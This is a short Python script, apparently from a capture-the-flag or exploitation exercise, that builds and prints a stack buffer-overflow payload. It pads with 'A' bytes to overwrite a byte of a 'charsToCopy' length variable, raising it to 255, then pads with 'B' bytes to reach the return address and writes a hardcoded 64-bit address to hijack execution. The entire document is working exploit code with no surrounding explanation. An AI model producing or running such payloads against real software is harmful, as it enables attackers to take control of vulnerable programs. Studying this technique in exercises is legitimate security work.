#!/usr/bin/env python
import struct

payload = ""

payload += "A" * 40 + '\xff' # padding plus 1 byte to overwrite the first byte of the charsToCopy variable from 140 to 255

payload += "B" * 286 # padding to reach the return address

payload += struct.pack("<Q", 0x55555555488c)


print(payload)
